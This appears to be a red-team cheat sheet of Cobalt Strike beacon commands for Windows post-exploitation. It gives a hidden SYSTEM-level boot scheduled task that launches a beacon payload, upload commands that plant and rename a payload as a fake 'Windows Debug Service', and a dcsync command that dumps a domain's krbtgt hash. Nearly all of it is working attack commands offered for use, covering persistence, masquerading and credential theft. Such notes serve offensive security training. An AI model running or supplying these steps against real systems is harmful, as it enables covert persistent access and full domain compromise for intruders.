**Scheduled Task**

> Create a task.xml on your machine.

 ```xml
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\beacon_x64.exe</Command>
		</Exec>
	</Actions>
</Task>
```

```powershell
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\dns_x64.exe
beacon> schtaskscreate \Beacon XML CREATE #Subes el XML
```


**Windows Service**

```powershell
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe debug_svc.exe

beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
```

- Verify that it was created correctly
```powershell
beacon> sc_qc dbgsvc
```


## Dump Hashes

```powershell
beacon> dcsync contoso.com CONTOSO\krbtgt
```
